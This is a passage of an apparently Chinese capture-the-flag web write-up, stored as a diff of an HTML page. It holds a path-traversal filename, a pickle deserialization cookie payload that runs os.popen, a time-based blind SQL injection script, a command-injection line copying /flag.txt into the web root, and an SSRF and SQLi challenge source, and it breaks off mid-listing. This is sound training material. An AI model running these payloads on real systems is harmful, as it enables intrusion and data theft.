+                    <a href="#%e5%87%ba%e9%a2%98%e4%ba%ba%e5%8f%88%e7%96%af%e5%a4%8d%e7%8e%b0" aria-label="出题人又疯(复现)">出题人又疯(复现)</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
+<h3 id="signin"><strong>Signin</strong><a hidden class="anchor" aria-hidden="true" href="#signin">#</a></h3>
+<p>题目</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c"># -*- encoding: utf-8 -*-</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="err"></span><span class="s1">&#39;&#39;</span><span class="err">&#39;
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="err"></span>@File    :   main.py<span class="err">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err"></span>@Time    :   2025/03/28 22:20:49<span class="err">
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="err"></span>@Author  :   LamentXU <span class="err">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="err"></span><span class="s1">&#39;&#39;</span><span class="err">&#39;
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="err"></span><span class="s1">&#39;&#39;</span><span class="err">&#39;
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="err"></span>flag in /flag_<span class="o">{</span>uuid4<span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="err"></span><span class="s1">&#39;&#39;</span><span class="err">&#39;
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="err"></span><span class="k">from</span><span class="s"> bottle import Bottle, request, response, redirect, static_file, run, route</span><span class="err">
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="err"></span>with open<span class="o">(</span><span class="s1">&#39;../../secret.txt&#39;</span>, <span class="s1">&#39;r&#39;</span><span class="o">)</span> as f:<span class="err">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="err"></span>    <span class="nv">secret</span> <span class="o">=</span> f.read<span class="o">()</span><span class="err">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="err"></span><span class="nv">app</span> <span class="o">=</span> Bottle<span class="o">()</span><span class="err">
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="err"></span>@route<span class="o">(</span><span class="s1">&#39;/&#39;</span><span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="err"></span>def index<span class="o">()</span>:<span class="err">
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err"></span>    <span class="k">return</span> <span class="s1">&#39;&#39;&#39;HI&#39;&#39;&#39;</span><span class="err">
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="err"></span>@route<span class="o">(</span><span class="s1">&#39;/download&#39;</span><span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="err"></span>def download<span class="o">()</span>:<span class="err">
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="err"></span>    <span class="nv">name</span> <span class="o">=</span> request.query.filename<span class="err">
+</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="err"></span>    <span class="k">if</span> <span class="s1">&#39;../../&#39;</span> in name or name.startswith<span class="o">(</span><span class="s1">&#39;/&#39;</span><span class="o">)</span> or name.startswith<span class="o">(</span><span class="s1">&#39;../&#39;</span><span class="o">)</span> or <span class="s1">&#39;\\&#39;</span> in name:<span class="err">
+</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="err"></span>        response.status <span class="o">=</span> <span class="m">403</span><span class="err">
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="err"></span>        <span class="k">return</span> <span class="s1">&#39;Forbidden&#39;</span><span class="err">
+</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="err"></span>    with open<span class="o">(</span>name, <span class="s1">&#39;rb&#39;</span><span class="o">)</span> as f:<span class="err">
+</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="err"></span>        <span class="nv">data</span> <span class="o">=</span> f.read<span class="o">()</span><span class="err">
+</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="err"></span>    <span class="k">return</span> data<span class="err">
+</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err"></span>@route<span class="o">(</span><span class="s1">&#39;/secret&#39;</span><span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err"></span>def secret_page<span class="o">()</span>:<span class="err">
+</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="err"></span>    try:<span class="err">
+</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="err"></span>        <span class="nv">session</span> <span class="o">=</span> request.get_cookie<span class="o">(</span><span class="s2">&#34;name&#34;</span>, <span class="nv">secret</span><span class="o">=</span>secret<span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="err"></span>        <span class="k">if</span> not session or session<span class="o">[</span><span class="s2">&#34;name&#34;</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&#34;guest&#34;</span>:<span class="err">
+</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="err"></span>            <span class="nv">session</span> <span class="o">=</span> <span class="o">{</span><span class="s2">&#34;name&#34;</span>: <span class="s2">&#34;guest&#34;</span><span class="o">}</span><span class="err">
+</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="err"></span>            response.set_cookie<span class="o">(</span><span class="s2">&#34;name&#34;</span>, session, <span class="nv">secret</span><span class="o">=</span>secret<span class="o">)</span><span class="err">
+</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="err"></span>            <span class="k">return</span> <span class="s1">&#39;Forbidden!&#39;</span><span class="err">
+</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="err"></span>        <span class="k">if</span> session<span class="o">[</span><span class="s2">&#34;name&#34;</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span>:<span class="err">
+</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="err"></span>            <span class="k">return</span> <span class="s1">&#39;The secret has been deleted!&#39;</span><span class="err">
+</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="err"></span>    except:<span class="err">
+</span></span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="err"></span>        <span class="k">return</span> <span class="s2">&#34;Error!&#34;</span><span class="err">
+</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="err"></span><span class="k">run</span><span class="o">(</span><span class="nv">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span>, <span class="nv">port</span><span class="o">=</span>8080, <span class="nv">debug</span><span class="o">=</span>False<span class="o">)</span><span class="err">
+</span></span></span></code></pre></div><p>目录穿越拿secret</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">./.././../secret.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">Hell0_H@cker_Y0u_A3r_Sm@r7
+</span></span></code></pre></div><p>看到get_cookie打pickle反序列化(get_cookie中会进行pickle反序列化)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">cookie_encode</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="s2">&#34;Hell0_H@cker_Y0u_A3r_Sm@r7&#34;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">class</span> <span class="nc">Name</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;&#34;&#34;__import__(&#39;os&#39;).popen(&#39;calc&#39;).read()&#34;&#34;&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">exp</span> <span class="o">=</span> <span class="n">cookie_encode</span><span class="p">((</span><span class="s1">&#39;session&#39;</span><span class="p">,{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="p">[</span><span class="n">Name</span><span class="p">()]}),</span><span class="n">secret</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+</span></span></code></pre></div><p>‍</p>
+<h3 id="ezsql手动滑稽"><strong>ezsql(手动滑稽)</strong><a hidden class="anchor" aria-hidden="true" href="#ezsql手动滑稽">#</a></h3>
+<p>这题大概fuzz一下可以发现username处waf很多</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="o">-</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">=</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="o">|</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="o">&amp;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">空格</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">order</span> <span class="n">by</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">like</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">handler</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="ow">and</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">union</span>
+</span></span></code></pre></div><p>在password处会对单双引号进行转义</p>
+<p>那我们只需要想办法构造闭合然后打时间盲注，由于会对单引号进行转义，我这里用的无列名注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;xxxxx&#34;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">       <span class="c1"># 查表名</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># 无列名注入</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># payload = &#34;select b from (select 1 as b,2 union select * from user limit 1,1)xrntkk&#34;</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select b from (select 1 as b union select * from double_check limit 1,1)xrntkk&#34;</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl">
+</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&#34;1&#39;or</span><span class="se">\t</span><span class="s2">1=&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s1">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s1">,sleep(1),1)#&#39;</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">
+</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></div><p>可以拿到key</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="n">Result</span> <span class="p">:</span> <span class="n">dtfrtkcc0czkoua9S</span>
+</span></span></code></pre></div><p><img alt="image" loading="lazy" src="assets/image-20250407001235-klyirfh.png"></p>
+<p>在doublecheck.php中输入拿到的key后，会跳转到index.php，可以进行命令执行但是无回显</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">cat</span><span class="o">%</span><span class="mi">09</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">txt</span><span class="o">&gt;/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span>
+</span></span></code></pre></div><p>‍</p>
+<h3 id="fate">Fate<a hidden class="anchor" aria-hidden="true" href="#fate">#</a></h3>
+<p>源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">flask</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">sqlite3</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">blacklist</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">binary_to_string</span><span class="p">(</span><span class="n">binary_string</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_string</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Binary string length must be a multiple of 8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">binary_chunks</span> <span class="o">=</span> <span class="p">[</span><span class="n">binary_string</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_string</span><span class="p">),</span> <span class="mi">8</span><span class="p">)]</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">string_output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span> <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">binary_chunks</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    
+</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">return</span> <span class="n">string_output</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/proxy&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">def</span> <span class="nf">nolettersproxy</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;No URL provided&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="n">target_url</span> <span class="o">=</span> <span class="s2">&#34;http://lamentxu.top&#34;</span> <span class="o">+</span> <span class="n">url</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="s1">&#39;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;.&#34;</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="s1">&#39;No ssrf allowed&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">
+</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">Response</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="k">def</span> <span class="nf">db_search</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">with</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;database.db&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#39;</span><span class="si">{</span><span class="n">code</span><span class="si">}</span><span class="s2">&#39;)))))))&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="n">found</span> <span class="o">=</span> <span class="n">cur</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">return</span> <span class="kc">None</span> <span class="k">if</span> <span class="n">found</span> <span class="ow">is</span> <span class="kc">None</span> <span class="k">else</span> <span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl">
+</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">42</span><span class="cl">    <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl">
+</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/1337&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="k">def</span> <span class="nf">api_search</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="k">if</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">==</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="k">if</span> <span class="n">code</span> <span class="o">==</span> <span class="s1">&#39;abcdefghi&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;0 win!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">50</span><span class="cl">            <span class="n">req</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">51</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">52</span><span class="cl">                <span class="n">req</span> <span class="o">=</span> <span class="n">binary_to_string</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">53</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">54</span><span class="cl">                <span class="n">req</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">req</span><span class="p">)</span> <span class="c1"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span>
+</span></span><span class="line"><span class="ln">55</span><span class="cl">            <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">56</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;Invalid JSON&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">57</span><span class="cl">            <span class="k">if</span> <span class="s1">&#39;name&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">req</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">58</span><span class="cl">                <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s2">&#34;Empty Person&#39;s name&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">59</span><span class="cl">
+</span></span><span class="line"><span class="ln">60</span><span class="cl">            <span class="n">name</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">61</span><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">:</span>
